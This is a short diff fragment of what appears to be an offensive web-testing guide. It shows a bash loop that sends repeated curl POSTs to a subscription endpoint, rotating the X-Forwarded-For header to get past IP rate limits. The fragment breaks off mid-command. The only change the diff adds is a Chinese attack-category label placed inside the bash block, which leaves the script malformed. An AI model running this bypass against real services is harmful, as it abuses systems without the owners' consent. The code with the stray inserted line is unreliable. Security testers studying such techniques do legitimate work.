@@ -75,6 +75,7 @@ Asset types that pay: checkout flows, subscription endpoints, callback/verificat
 **Rate limit bypass via header rotation:**
 ```bash
 # Rotate X-Forwarded-For to bypass IP rate limiting
+- 攻击大类:C09 Web应用漏洞利用
 for i in $(seq 1 100); do
   curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/api/subscribe \
     -H "X-Forwarded-For: 10.0.0.$i" \
